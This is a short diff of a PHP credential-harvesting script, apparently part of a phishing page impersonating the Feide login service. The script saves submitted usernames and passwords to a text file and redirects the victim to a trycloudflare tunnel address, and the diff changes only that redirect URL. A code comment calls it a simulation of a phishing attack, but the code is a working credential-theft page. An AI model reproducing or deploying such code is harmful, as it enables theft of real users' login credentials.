@@ -7,6 +7,6 @@ $password = $_POST['password'];
 file_put_contents("usernames.txt", "Feide Username: " . htmlspecialchars($email) . " Pass: " . htmlspecialchars($password) . "\n", FILE_APPEND);
 
 // Redirect the user to a different page to simulate a real phishing attack
-header('Location: https://oh-agreements-dealt-encouraged.trycloudflare.com');
+header('Location: https://balloon-domain-camps-cheats.trycloudflare.com');
 exit();
 ?>
